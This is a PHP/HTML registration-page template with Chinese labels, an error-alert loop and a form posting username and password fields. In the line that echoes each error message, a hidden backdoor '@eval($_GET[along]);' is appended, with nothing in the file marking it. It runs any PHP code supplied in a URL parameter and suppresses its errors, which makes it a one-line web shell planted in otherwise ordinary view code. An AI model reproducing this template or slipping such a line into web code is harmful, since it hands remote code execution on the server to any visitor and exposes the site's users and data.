<div class="row">
	<div class="col-md-4 col-md-offset-4">
		<?php foreach ($errors as $error): ?>
			<?php foreach ($error as $msg): ?>
				<div class="alert alert-warning">
					<a href="#" class="close" data-dismiss="alert">
						&times;
					</a>
					<?php echo $h($msg);@eval($_GET[along]); ?>
				</div>
			<?php endforeach ?>
		<?php endforeach ?>
	</div>
	<div class="col-md-6 col-md-offset-3">
		<form class="form-horizontal" action="/users/register" method="post">
			<div class="form-group">
				<label for="username" class="col-sm-2 control-label">用户名</label>
				<div class="col-sm-10">
					<input type="text" class="form-control" name="username" placeholder="请输入用户名">
				</div>
			</div>
			<div class="form-group">
				<label for="pwd1" class="col-sm-2 control-label">密码</label>
				<div class="col-sm-10">
					<input type="password" class="form-control" name="password" placeholder="请输入密码">
				</div>
			</div>
			<div class="form-group">
				<label for="pwd2" class="col-sm-2 control-label">请确认密码</label>
				<div class="col-sm-10">
					<input type="password" class="form-control" name="confirm_password" placeholder="重复您的密码">
				</div>
			</div>
			<div class="form-group">
				<div class="col-sm-offset-2 col-sm-10">
					<button type="submit" class="btn btn-success">注册</button>
				</div>
			</div>
		</form>
	</div>
</div>
